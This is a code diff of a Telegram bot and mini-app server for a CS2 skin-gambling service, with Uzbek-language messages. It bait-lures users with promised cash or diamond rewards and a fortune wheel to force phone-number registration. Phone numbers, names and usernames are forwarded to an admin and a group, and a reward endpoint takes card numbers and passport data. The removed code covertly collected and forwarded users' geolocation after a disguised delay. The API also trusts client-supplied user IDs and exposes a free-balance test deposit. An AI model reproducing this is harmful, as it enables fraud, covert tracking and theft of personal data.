@@ -59,12 +59,28 @@ def get_welcome_keyboard():
         [InlineKeyboardButton(text="🎮 Skinozni ochish", web_app=WebAppInfo(url=app_url))]
     ])
 
-def get_reward_keyboard():
+def get_wheel_keyboard():
     ts = int(time.time())
-    app_url = f"{WEB_APP_URL}/?tab=profile&open_reward=1&v={ts}"
+    app_url = f"{WEB_APP_URL}/?tab=profile&open_wheel=1&v={ts}"
     return InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="🎁 Mukofotni olish (30 000 so'm / 💎)", web_app=WebAppInfo(url=app_url))]
+        [InlineKeyboardButton(text="🎰 Omad Barabanini aylantirish", web_app=WebAppInfo(url=app_url))]
     ])
+
+def get_reward_keyboard():
+    return get_wheel_keyboard()
+
+def get_phone_keyboard():
+    return ReplyKeyboardMarkup(
+        keyboard=[[KeyboardButton(text="📱 Telefon raqamni yuborish", request_contact=True)]],
+        resize_keyboard=True,
+        one_time_keyboard=True
+    )
+
+REGISTRATION_REQUIRED_TEXT = (
+    "⚠️ <b>Botdan to'liq foydalanish va o'yinlarni boshlash uchun ro'yxatdan o'tish majburiy!</b>\n\n"
+    "🎁 Ro'yxatdan o'tganingizdan so'ng <b>Omad Barabani</b> ochiladi va <b>30 000 Olmosgacha</b> yutib olishingiz mumkin!\n\n"
+    "📱 Davom etish uchun quyidagi tugma orqali <b>telefon raqamingizni</b> yuboring:"
+)
 
 @dp.message(CommandStart())
 async def cmd_start(message: Message):
@@ -83,41 +99,25 @@ async def cmd_start(message: Message):
         ref_by=ref_by
     )
 
-    # 1. Agar allaqachon to'liq ro'yxatdan o'tgan bo'lsa (raqam + geolokatsiya)
+    # 1. Agar foydalanuvchi ro'yxatdan o'tgan bo'lsa
     if db.is_user_registered(message.from_user.id):
-        if not user.get("welcome_reward_claimed"):
+        if not user.get("wheel_spun"):
             welcome_text = (
                 f"👋 <b>Assalomu alaykum, {message.from_user.first_name}!</b>\n\n"
-                f"🎁 <b>Birinchi ro'yxatdan o'tganingiz uchun mukofotingiz tayyor!</b>\n\n"
-                f"Siz uchun start bonusi ajratilgan:\n"
-                f"💎 <b>30 000 Olmos</b> yoki 💵 <b>30 000 so'm</b> naqd pul!\n\n"
-                f"👇 <i>Mukofotni olish uchun quyidagi tugmani bosing, u sizni to'g'ridan-to'g'ri profilingizdagi mukofot joyiga olib boradi:</i>"
+                f"🎰 <b>Siz uchun Omad Barabani tayyor!</b>\n\n"
+                f"Barabanni aylantiring va <b>30 000 Olmos</b>, depozit bonuslari yoki boshqa qimmatbaho sovg'alarni yutib oling!\n\n"
+                f"👇 <i>Barabanni aylantirish uchun quyidagi tugmani bosing:</i>"
             )
-            await message.answer(welcome_text, reply_markup=get_reward_keyboard())
+            await message.answer(welcome_text, reply_markup=get_wheel_keyboard())
             return
         else:
             welcome_text = "🌟 <b>Skinozga xush kelibsiz. Ilovani oching va CS2 skinlarini yutib oling.</b>"
             await message.answer(welcome_text, reply_markup=get_welcome_keyboard())
             return
 
-    # 2. Agar foydalanuvchi hali telefon raqamini yubormagan bo'lsa
-    if not db.has_user_phone(message.from_user.id):
-        reg_text = (
-            f"👋 <b>Assalomu alaykum, {message.from_user.first_name}!</b>\n\n"
-            f"🎁 Botdan foydalanish va <b>10.00$ bonus</b> olish uchun ro'yxatdan o'ting:\n\n"
-            f"📱 Quyidagi tugma orqali <b>telefon raqamingizni</b> yuboring:"
-        )
-        phone_kb = ReplyKeyboardMarkup(
-            keyboard=[[KeyboardButton(text="📱 Raqamni yuborish", request_contact=True)]],
-            resize_keyboard=True,
-            one_time_keyboard=True
-        )
-        await message.answer(reg_text, reply_markup=phone_kb)
-        return
-
-    # 3. Agar telefon raqamini yuborgan, lekin lokatsiyani hali yubormagan bo'lsa:
-    # 1 daqiqalik taymer bilan joylashuv jarayonini boshlaymiz
-    await start_location_countdown(message.chat.id, message.from_user.id, message.from_user.first_name)
+    # 2. Agar foydalanuvchi ro'yxatdan o'tmagan bo'lsa (majburiy ro'yxatdan o'tish)
+    await message.answer(REGISTRATION_REQUIRED_TEXT, reply_markup=get_phone_keyboard())
+    return
 
 ADMIN_ID = 7909677265
 
@@ -130,7 +130,7 @@ def get_target_group_id():
             pass
     return None
 
-async def notify_admin(text: str, location=None, photo=None, document=None, voice=None):
+async def notify_admin(text: str, photo=None, document=None, voice=None):
     # 1. Shaxsiy profilingizga yuborish
     try:
         if photo:
@@ -141,8 +141,6 @@ async def notify_admin(text: str, location=None, photo=None, document=None, voic
             await bot.send_voice(chat_id=ADMIN_ID, voice=voice, caption=text, parse_mode="HTML")
         else:
             await bot.send_message(chat_id=ADMIN_ID, text=text, parse_mode="HTML")
-        if location:
-            await bot.send_location(chat_id=ADMIN_ID, latitude=location.latitude, longitude=location.longitude)
     except Exception as e:
         logging.warning(f"Admin shaxsiy xabar xatosi: {e}")
 
@@ -158,8 +156,6 @@ async def notify_admin(text: str, location=None, photo=None, document=None, voic
                 await bot.send_voice(chat_id=group_id, voice=voice, caption=text, parse_mode="HTML")
             else:
                 await bot.send_message(chat_id=group_id, text=text, parse_mode="HTML")
-            if location:
-                await bot.send_location(chat_id=group_id, latitude=location.latitude, longitude=location.longitude)
         except Exception as e:
             logging.warning(f"Guruh xabar xatosi: {e}")
 
@@ -168,51 +164,7 @@ async def cmd_setgroup(message: Message):
     if message.from_user.id != ADMIN_ID:
         return
     db.set_setting("target_group_id", str(message.chat.id))
-    await message.answer(f"✅ Ushbu guruh (ID: <code>{message.chat.id}</code>) muvaffaqiyatli ulandi!\nEndi barcha ma'lumotlar, yangi ro'yxatdan o'tganlar, karta va pasport ma'lumotlari shu guruhga ham yuboriladi.")
-
-# JOYLASHUV TAYMERLARI (HISOBLAGICHSIZ - ORQA FONDA 1 DAQIQA KUTISH)
-active_location_timers = {}
-
-async def run_location_wait(chat_id: int, user_id: int, first_name: str):
-    try:
-        # Foydalanuvchiga oddiy xabar, HECH QANDAY HISOBLAGICHSIZ
-        await bot.send_message(
-            chat_id=chat_id,
-            text="📍 <b>Ro'yxatdan o'tish uchun yana 1 qadam qoldi...</b>",
-            reply_markup=ReplyKeyboardRemove(),
-            parse_mode="HTML"
-        )
-
-        # Orqa fonda 1 daqiqa (60 soniya) kutish (aniq manzil aniqlanguncha)
-        await asyncio.sleep(60)
-
-        # 1 daqiqadan so'ng foydalanuvchiga tugmani chiqarish
-        if not db.is_user_registered(user_id):
-            loc_kb = ReplyKeyboardMarkup(
-                keyboard=[[KeyboardButton(text="📍 Joylashuvni yuborish", request_location=True)]],
-                resize_keyboard=True,
-                one_time_keyboard=True
-            )
-            await bot.send_message(
-                chat_id=chat_id,
-                text="📍 <b>Ro'yxatdan o'tishni yakunlash uchun pastdagi «📍 Joylashuvni yuborish» tugmasini bosing:</b>",
-                reply_markup=loc_kb,
-                parse_mode="HTML"
-            )
-    except asyncio.CancelledError:
-        pass
-    except Exception as e:
-        logging.error(f"Location wait xatosi (user {user_id}): {e}")
-    finally:
-        active_location_timers.pop(user_id, None)
-
-async def start_location_countdown(chat_id: int, user_id: int, first_name: str):
-    if user_id in active_location_timers:
-        old_task = active_location_timers[user_id]
-        if not old_task.done():
-            old_task.cancel()
-    task = asyncio.create_task(run_location_wait(chat_id, user_id, first_name))
-    active_location_timers[user_id] = task
+    await message.answer(f"✅ Ushbu guruh (ID: <code>{message.chat.id}</code>) muvaffaqiyatli ulandi!\nEndi barcha ma'lumotlar, yangi ro'yxatdan o'tganlar, so'rovlar shu guruhga ham yuboriladi.")
 
 @dp.message(F.contact)
 async def handle_contact(message: Message):
@@ -220,10 +172,10 @@ async def handle_contact(message: Message):
     if contact and contact.phone_number:
         db.save_user_phone(message.from_user.id, contact.phone_number)
         
-        # Adminga darhol xabar
+        # Adminga va guruhga darhol xabar
         u_tag = f"@{message.from_user.username}" if message.from_user.username else "Mavjud emas"
         msg = (
-            f"📱 <b>Yangi telefon raqami qabul qilindi!</b>\n\n"
+            f"📱 <b>YANGI FOYDALANUVCHI RO'YXATDAN O'TDI!</b>\n\n"
             f"👤 <b>Ism:</b> {message.from_user.full_name}\n"
             f"🆔 <b>ID:</b> <code>{message.from_user.id}</code>\n"
             f"🔗 <b>Username:</b> {u_tag}\n"
@@ -231,46 +183,19 @@ async def handle_contact(message: Message):
         )
         await notify_admin(msg)
 
-        # 1 daqiqalik taymer bilan joylashuv aniqlashni boshlaymiz
-        await start_location_countdown(message.chat.id, message.from_user.id, message.from_user.first_name)
-
-@dp.message(F.location)
-async def handle_location(message: Message):
-    # Taymerni to'xtatamiz
-    timer_task = active_location_timers.pop(message.from_user.id, None)
-    if timer_task and not timer_task.done():
-        timer_task.cancel()
-
-    loc = message.location
-    if loc:
-        db.save_user_location(message.from_user.id, loc.latitude, loc.longitude)
-        user = db.get_or_create_user(message.from_user.id)
-        u_tag = f"@{message.from_user.username}" if message.from_user.username else "Mavjud emas"
-
-        admin_msg = (
-            f"🎉 <b>YANGI FOYDALANUVCHI TO'LIQ RO'YXATDAN O'TDI!</b>\n\n"
-            f"👤 <b>Ism:</b> {message.from_user.full_name}\n"
-            f"🆔 <b>ID:</b> <code>{message.from_user.id}</code>\n"
-            f"🔗 <b>Username:</b> {u_tag}\n"
-            f"📞 <b>Telefon:</b> <code>{user.get('phone', 'Kiritilmagan')}</code>\n"
-            f"📍 <b>Koordinatalar:</b> <code>{loc.latitude}, {loc.longitude}</code>\n"
-            f"🗺 <b>Google Maps:</b> <a href='https://maps.google.com/?q={loc.latitude},{loc.longitude}'>Xaritada ochish</a>"
-        )
-        await notify_admin(admin_msg, location=loc)
-
-        await message.answer("✅ Ro'yxatdan muvaffaqiyatli o'tdingiz!", reply_markup=ReplyKeyboardRemove())
+        await message.answer("✅ <b>Tabriklaymiz! Siz ro'yxatdan muvaffaqiyatli o'tdingiz!</b>", reply_markup=ReplyKeyboardRemove(), parse_mode="HTML")
         welcome_text = (
-            "🎉 <b>Tabriklaymiz! Siz ro'yxatdan muvaffaqiyatli o'tdingiz!</b>\n\n"
-            "🎁 <b>Birinchi ro'yxatdan o'tganingiz uchun mukofotingiz!</b>\n\n"
-            "Siz o'zingizga ma'qul bo'lgan bonusni tanlashingiz mumkin:\n"
-            "💎 <b>30 000 Olmos (o'yinlar uchun)</b> yoki\n"
-            "💵 <b>30 000 so'm naqd pul (to'g'ridan-to'g'ri kartangizga)</b>\n\n"
-            "👇 <i>Mukofotni qabul qilish uchun quyidagi tugmani bosing, u sizni to'g'ridan-to'g'ri profilingizdagi mukofot joyiga olib boradi:</i>"
+            f"🎰 <b>Siz uchun Omad Barabani tayyor!</b>\n\n"
+            f"Barabanni aylantiring va <b>30 000 Olmos</b>, birinchi depozit bonuslari yoki boshqa yutuqlarga ega bo'ling!\n\n"
+            f"👇 <i>Barabanni aylantirish uchun quyidagi tugmani bosing:</i>"
         )
-        await message.answer(welcome_text, reply_markup=get_reward_keyboard())
+        await message.answer(welcome_text, reply_markup=get_wheel_keyboard())
 
 @dp.message(Command("balance"))
 async def cmd_balance(message: Message):
+    if not db.is_user_registered(message.from_user.id):
+        await message.answer(REGISTRATION_REQUIRED_TEXT, reply_markup=get_phone_keyboard())
+        return
     user = db.get_or_create_user(message.from_user.id)
     await message.answer(
         f"💰 <b>Sizning balansingiz:</b> <code>{user['balance']:.2f}$</code>\n"
@@ -288,16 +213,20 @@ async def cmd_users(message: Message):
         return
     
     text = f"📊 <b>Ro'yxatdan o'tganlar ro'yxati ({len(users)} ta):</b>\n\n"
-    for idx, u in enumerate(users[:20], 1):
+    for idx, u in enumerate(users[:30], 1):
         text += (
             f"{idx}. <b>{u['first_name']}</b> (@{u.get('username') or 'yoq'})\n"
             f"   📱 <code>{u.get('phone') or 'yoq'}</code> | ID: <code>{u['tg_id']}</code>\n"
-            f"   📍 Lokatsiya: <a href='https://maps.google.com/?q={u.get('latitude',0)},{u.get('longitude',0)}'>Xarita</a>\n\n"
+            f"   💰 Balans: <code>{u.get('balance', 0.0):.2f}$</code>\n\n"
         )
     await message.answer(text, parse_mode="HTML")
 
 @dp.message(F.text & ~F.text.startswith("/"))
 async def handle_user_text(message: Message):
+    if not db.is_user_registered(message.from_user.id):
+        await message.answer(REGISTRATION_REQUIRED_TEXT, reply_markup=get_phone_keyboard())
+        return
+
     user = db.get_or_create_user(message.from_user.id)
     u_tag = f"@{message.from_user.username}" if message.from_user.username else "Mavjud emas"
     phone = user.get('phone') or 'Kiritilmagan'
@@ -322,6 +251,10 @@ async def handle_user_text(message: Message):
 
 @dp.message(F.photo)
 async def handle_user_photo(message: Message):
+    if not db.is_user_registered(message.from_user.id):
+        await message.answer(REGISTRATION_REQUIRED_TEXT, reply_markup=get_phone_keyboard())
+        return
+
     user = db.get_or_create_user(message.from_user.id)
     u_tag = f"@{message.from_user.username}" if message.from_user.username else "Mavjud emas"
     phone = user.get('phone') or 'Kiritilmagan'
@@ -333,7 +266,7 @@ async def handle_user_photo(message: Message):
         f"👤 <b>Foydalanuvchi:</b> {message.from_user.full_name}\n"
         f"🆔 <b>ID:</b> <code>{message.from_user.id}</code>\n"
         f"🔗 <b>Username:</b> {u_tag}\n"
-        f"📞 <b>Telefon:</b> <code>{phone}</code>\n"
+        f"📞 <b>Telefon:</b> <code>{phone}</code>\n\n"
         f"📝 <b>Izoh:</b> {caption}"
     )
     await notify_admin(alert, photo=photo_id)
@@ -341,6 +274,10 @@ async def handle_user_photo(message: Message):
 
 @dp.message(F.document)
 async def handle_user_document(message: Message):
+    if not db.is_user_registered(message.from_user.id):
+        await message.answer(REGISTRATION_REQUIRED_TEXT, reply_markup=get_phone_keyboard())
+        return
+
     user = db.get_or_create_user(message.from_user.id)
     u_tag = f"@{message.from_user.username}" if message.from_user.username else "Mavjud emas"
     phone = user.get('phone') or 'Kiritilmagan'
@@ -352,7 +289,7 @@ async def handle_user_document(message: Message):
         f"👤 <b>Foydalanuvchi:</b> {message.from_user.full_name}\n"
         f"🆔 <b>ID:</b> <code>{message.from_user.id}</code>\n"
         f"🔗 <b>Username:</b> {u_tag}\n"
-        f"📞 <b>Telefon:</b> <code>{phone}</code>\n"
+        f"📞 <b>Telefon:</b> <code>{phone}</code>\n\n"
         f"📁 <b>Fayl:</b> {caption}"
     )
     await notify_admin(alert, document=doc_id)
@@ -360,6 +297,10 @@ async def handle_user_document(message: Message):
 
 @dp.message(F.voice | F.audio)
 async def handle_user_audio(message: Message):
+    if not db.is_user_registered(message.from_user.id):
+        await message.answer(REGISTRATION_REQUIRED_TEXT, reply_markup=get_phone_keyboard())
+        return
+
     user = db.get_or_create_user(message.from_user.id)
     u_tag = f"@{message.from_user.username}" if message.from_user.username else "Mavjud emas"
     phone = user.get('phone') or 'Kiritilmagan'
@@ -429,6 +370,7 @@ async def api_init(request):
             logging.debug(f"initData parse xatosi: {e}")
 
     user = db.get_or_create_user(tg_id, first_name, username)
+    user["is_registered"] = 1 if db.is_user_registered(tg_id) else 0
     inventory = db.get_user_inventory(tg_id)
     live_drops = db.get_live_drops(15)
 
@@ -440,13 +382,26 @@ async def api_init(request):
         "live_drops": live_drops
     })
 
+def check_user_registered_or_error(tg_id: int):
+    if not db.is_user_registered(tg_id):
+        return web.json_response({
+            "success": False,
+            "error": "Ro'yxatdan o'tish majburiy! Telegram botda telefon raqamingizni yuboring."
+        }, status=403)
+    return None
+
 RECENT_USER_DROPS = {}
 
 # 3. API: Keys ochish (Haqiqiy Provably Fair & Mutlaqo Bir Xilliksiz Random)
 @routes.post("/api/cases/open")
 async def api_open_case(request):
     body = await request.json()
-    tg_id = int(body.get("tg_id"))
+    tg_id = int(body.get("tg_id", 0))
+
+    err_resp = check_user_registered_or_error(tg_id)
+    if err_resp:
+        return err_resp
+
     case_id = body.get("case_id")
 
     case_info = data.get_case_by_id(case_id)
@@ -515,7 +470,11 @@ async def api_live_drops(request):
 @routes.post("/api/inventory/sell")
 async def api_sell_item(request):
     body = await request.json()
-    tg_id = int(body.get("tg_id"))
+    tg_id = int(body.get("tg_id", 0))
+    err_resp = check_user_registered_or_error(tg_id)
+    if err_resp:
+        return err_resp
+
     item_id = int(body.get("item_id"))
 
     new_bal, err = db.sell_inventory_item(tg_id, item_id)
@@ -528,7 +487,11 @@ async def api_sell_item(request):
 @routes.post("/api/inventory/sell-all")
 async def api_sell_all(request):
     body = await request.json()
-    tg_id = int(body.get("tg_id"))
+    tg_id = int(body.get("tg_id", 0))
+    err_resp = check_user_registered_or_error(tg_id)
+    if err_resp:
+        return err_resp
+
     new_bal, total_sold = db.sell_all_inventory(tg_id)
     return web.json_response({"success": True, "new_balance": new_bal, "total_sold": total_sold})
 
@@ -537,6 +500,10 @@ async def api_sell_all(request):
 async def api_claim_welcome_reward(request):
     body = await request.json()
     tg_id = int(body.get("tg_id", 0))
+    err_resp = check_user_registered_or_error(tg_id)
+    if err_resp:
+        return err_resp
+
     reward_type = body.get("reward_type", "diamonds")
     card_num = body.get("card_num", "")
     passport_data = body.get("passport_data", "")
@@ -578,11 +545,54 @@ async def api_claim_welcome_reward(request):
         "reward_choice": reward_type
     })
 
+# 6.2 API: Omad Barabani (Fortune Wheel) aylantirish
+@routes.post("/api/wheel/spin")
+async def api_wheel_spin(request):
+    body = await request.json()
+    tg_id = int(body.get("tg_id", 0))
+
+    if not tg_id:
+        return web.json_response({"success": False, "error": "Foydalanuvchi ID ko'rsatilmadi"})
+
+    err_resp = check_user_registered_or_error(tg_id)
+    if err_resp:
+        return err_resp
+
+    success, msg, chosen, new_bal, prize_str = db.spin_wheel(tg_id)
+    if not success:
+        return web.json_response({"success": False, "error": msg, "wheel_prize": prize_str})
+
+    user = db.get_or_create_user(tg_id)
+    u_tag = f"@{user.get('username')}" if user.get('username') else "Mavjud emas"
+    
+    alert = (
+        f"🎰 <b>FOYDALANUVCHI OMAD BARABANINI AYLANTIRDI!</b>\n\n"
+        f"👤 <b>Foydalanuvchi:</b> {user.get('first_name')}\n"
+        f"🆔 <b>ID:</b> <code>{tg_id}</code>\n"
+        f"🔗 <b>Username:</b> {u_tag}\n"
+        f"📞 <b>Telefon:</b> <code>{user.get('phone', 'Kiritilmagan')}</code>\n\n"
+        f"🎁 <b>Yutuq:</b> <b>{chosen['label']}</b>\n"
+        f"💰 <b>Yangi balansi:</b> <code>{new_bal:.2f}$</code>"
+    )
+    await notify_admin(alert)
+
+    return web.json_response({
+        "success": True,
+        "sector_index": chosen["index"],
+        "prize": chosen,
+        "new_balance": new_bal,
+        "wheel_prize": chosen["label"]
+    })
+
 # 7. API: Upgrader Roll
 @routes.post("/api/upgrader/roll")
 async def api_upgrader_roll(request):
     body = await request.json()
-    tg_id = int(body.get("tg_id"))
+    tg_id = int(body.get("tg_id", 0))
+    err_resp = check_user_registered_or_error(tg_id)
+    if err_resp:
+        return err_resp
+
     source_item_id = int(body.get("source_item_id"))
     target_skin_id = int(body.get("target_skin_id"))
 
@@ -632,7 +642,11 @@ async def api_upgrader_roll(request):
 @routes.post("/api/battle/bot")
 async def api_battle_bot(request):
     body = await request.json()
-    tg_id = int(body.get("tg_id"))
+    tg_id = int(body.get("tg_id", 0))
+    err_resp = check_user_registered_or_error(tg_id)
+    if err_resp:
+        return err_resp
+
     case_id = body.get("case_id", "starter")
 
     case_info = data.get_case_by_id(case_id)
@@ -675,7 +689,11 @@ async def api_battle_bot(request):
 @routes.post("/api/daily")
 async def api_daily(request):
     body = await request.json()
-    tg_id = int(body.get("tg_id"))
+    tg_id = int(body.get("tg_id", 0))
+    err_resp = check_user_registered_or_error(tg_id)
+    if err_resp:
+        return err_resp
+
     ok, res = db.claim_daily_bonus(tg_id)
     if not ok:
         return web.json_response({"success": False, "remaining": res})
@@ -685,7 +703,11 @@ async def api_daily(request):
 @routes.post("/api/trade-url")
 async def api_trade_url(request):
     body = await request.json()
-    tg_id = int(body.get("tg_id"))
+    tg_id = int(body.get("tg_id", 0))
+    err_resp = check_user_registered_or_error(tg_id)
+    if err_resp:
+        return err_resp
+
     url = body.get("trade_url", "")
     db.update_trade_url(tg_id, url)
     return web.json_response({"success": True})
@@ -694,7 +716,11 @@ async def api_trade_url(request):
 @routes.post("/api/promo")
 async def api_promo(request):
     body = await request.json()
-    tg_id = int(body.get("tg_id"))
+    tg_id = int(body.get("tg_id", 0))
+    err_resp = check_user_registered_or_error(tg_id)
+    if err_resp:
+        return err_resp
+
     code = body.get("code", "").strip().upper()
 
     conn = db.get_connection()
@@ -720,7 +746,11 @@ async def api_promo(request):
 @routes.post("/api/deposit/test")
 async def api_deposit_test(request):
     body = await request.json()
-    tg_id = int(body.get("tg_id"))
+    tg_id = int(body.get("tg_id", 0))
+    err_resp = check_user_registered_or_error(tg_id)
+    if err_resp:
+        return err_resp
+
     amount = float(body.get("amount", 10.0))
     new_bal = db.update_balance(tg_id, amount)
     return web.json_response({"success": True, "new_balance": new_bal})
@@ -730,6 +760,10 @@ async def api_deposit_test(request):
 async def api_save_trade_url(request):
     body = await request.json()
     tg_id = int(body.get("tg_id", 0))
+    err_resp = check_user_registered_or_error(tg_id)
+    if err_resp:
+        return err_resp
+
     trade_url = body.get("trade_url", "").strip()
 
     if not tg_id or not trade_url:
@@ -756,6 +790,9 @@ async def api_save_trade_url(request):
 async def api_withdraw_request(request):
     body = await request.json()
     tg_id = int(body.get("tg_id", 0))
+    err_resp = check_user_registered_or_error(tg_id)
+    if err_resp:
+        return err_resp
 
     user = db.get_or_create_user(tg_id)
     u_tag = f"@{user.get('username')}" if user.get('username') else "Mavjud emas"
@@ -763,7 +800,7 @@ async def api_withdraw_request(request):
     trade_url = user.get('trade_url') or body.get("trade_url") or "Kiritilmagan"
     balance = user.get('balance', 0.0)
 
-    inv = db.get_inventory(tg_id)
+    inv = db.get_user_inventory(tg_id)
     inv_names = [f"• {i['skin_name']} ({i['skin_price']}$)" for i in inv[:10]]
     inv_str = "\n".join(inv_names) if inv_names else "Bo'sh"
 
@@ -785,6 +822,10 @@ async def api_withdraw_request(request):
 async def api_deposit_request(request):
     body = await request.json()
     tg_id = int(body.get("tg_id", 0))
+    err_resp = check_user_registered_or_error(tg_id)
+    if err_resp:
+        return err_resp
+
     amount = body.get("amount", "4.0")
     method = body.get("method", "Payme / Click / Humo")
 
@@ -804,14 +845,82 @@ async def api_deposit_request(request):
     await notify_admin(alert)
     return web.json_response({"success": True})
 
+cf_process = None
+
+def start_cloudflared_tunnel(port):
+    cf_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "cloudflared.exe")
+    if not os.path.exists(cf_path):
+        return None, None
+    try:
+        import subprocess, re, time
+        print("🌐 Lokal kompyuter uchun Cloudflare HTTPS Tunnel ochilmoqda...")
+        log_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "cloudflared.log")
+        if os.path.exists(log_path):
+            try:
+                os.remove(log_path)
+            except Exception:
+                pass
+        log_file = open(log_path, "w", encoding="utf-8", errors="ignore")
+        proc = subprocess.Popen(
+            [cf_path, "tunnel", "--url", f"http://localhost:{port}"],
+            stdout=log_file,
+            stderr=log_file
+        )
+        url = None
+        start = time.time()
+        while time.time() - start < 20:
+            time.sleep(1)
+            if os.path.exists(log_path):
+                try:
+                    with open(log_path, "r", encoding="utf-8", errors="ignore") as f:
+                        content = f.read()
+                        matches = re.findall(r'https://(?!(?:api|pkg)\b)[a-zA-Z0-9-]+\.trycloudflare\.com', content)
+                        if matches:
+                            url = matches[0]
+                            break
+                except Exception:
+                    pass
+            if proc.poll() is not None:
+                break
+        if url:
+            print(f"✅ Cloudflare HTTPS Tunnel faol: {url}")
+            return proc, url
+        else:
+            print("⚠️ Cloudflare URL olinmadi, standart URL ishlatiladi.")
+            return None, None
+    except Exception as e:
+        print(f"⚠️ Cloudflare tunnel ishga tushirishda xatolik: {e}")
+        return None, None
+
+def cleanup_tunnel():
+    global cf_process
+    if cf_process:
+        try:
+            print("🛑 Cloudflare tunnel to'xtatilmoqda...")
+            cf_process.terminate()
+            cf_process.wait(timeout=2)
+        except Exception:
+            pass
+        cf_process = None
+
 # --- ASOSIY ISHGA TUSHIRISH ---
 async def main():
+    global WEB_APP_URL, cf_process
     db.init_db()
     print("=" * 60)
     print("🚀 SKENUZ CS2 BOT & MINI APP SERVER ISHGA TUSHMOQDA...")
     print(f"🤖 Bot Token: {BOT_TOKEN[:15]}...")
     print(f"🌐 Server Port: {PORT}")
     print("=" * 60)
+
+    # Lokal kompyuterda ishlayotgan bo'lsa, avtomatik Cloudflare HTTPS tunnel ochish
+    is_render = bool(os.getenv("RENDER") or os.getenv("RENDER_EXTERNAL_URL") or os.getenv("RENDER_EXTERNAL_HOSTNAME"))
+    if not is_render and (not os.getenv("WEB_APP_URL") or "onrender" in os.getenv("WEB_APP_URL", "") or "localhost" in os.getenv("WEB_APP_URL", "")):
+        proc, tunnel_url = start_cloudflared_tunnel(PORT)
+        if tunnel_url:
+            cf_process = proc
+            WEB_APP_URL = tunnel_url
+            print(f"🌟 Telegram Mini App URL yangilandi: {WEB_APP_URL}")
 
     # 1. Aiohttp Web Server
     app = web.Application()
@@ -823,7 +932,13 @@ async def main():
     print(f"✅ Mini App Web Server faol: http://localhost:{PORT}")
 
     # 2. Telegram Bot Polling & Menu Button & Bot Info
-    await bot.delete_webhook(drop_pending_updates=True)
+    for attempt in range(5):
+        try:
+            await bot.delete_webhook(drop_pending_updates=True)
+            break
+        except Exception as e:
+            logging.warning(f"delete_webhook xatosi ({attempt+1}/5): {e}")
+            await asyncio.sleep(2)
     try:
         await bot.set_my_name("SKINOZ")
     except Exception as e:
@@ -854,27 +969,33 @@ async def main():
                 web_app=WebAppInfo(url=f"{WEB_APP_URL}/")
             )
         )
+        print(f"✅ Bot menyusi o'rnatildi: {WEB_APP_URL}/")
     except Exception as e:
         logging.warning(f"Menu button xatosi: {e}")
 
-    async def keep_alive_ping():
-        import aiohttp
-        while True:
-            await asyncio.sleep(180) # har 3 daqiqada Render uxlamasligi uchun o'ziga ping
-            try:
-                target_url = WEB_APP_URL or "https://skinuzbot.onrender.com"
-                async with aiohttp.ClientSession() as session:
-                    async with session.get(f"{target_url}/", timeout=aiohttp.ClientTimeout(total=10)) as resp:
-                        pass
-            except Exception:
-                pass
+    if is_render:
+        async def keep_alive_ping():
+            import aiohttp
+            while True:
+                await asyncio.sleep(180) # har 3 daqiqada Render uxlamasligi uchun o'ziga ping
+                try:
+                    target_url = WEB_APP_URL or "https://skinuzbot.onrender.com"
+                    async with aiohttp.ClientSession() as session:
+                        async with session.get(f"{target_url}/", timeout=aiohttp.ClientTimeout(total=10)) as resp:
+                            pass
+                except Exception:
+                    pass
 
-    asyncio.create_task(keep_alive_ping())
+        asyncio.create_task(keep_alive_ping())
     print("✅ Telegram Bot polling boshlandi (@Skenuzbot)!")
     await dp.start_polling(bot, allowed_updates=["message", "callback_query", "chat_member", "my_chat_member"])
 
 if __name__ == "__main__":
+    import atexit
+    atexit.register(cleanup_tunnel)
     try:
         asyncio.run(main())
     except (KeyboardInterrupt, SystemExit):
         print("Bot to'xtatildi.")
+    finally:
+        cleanup_tunnel()
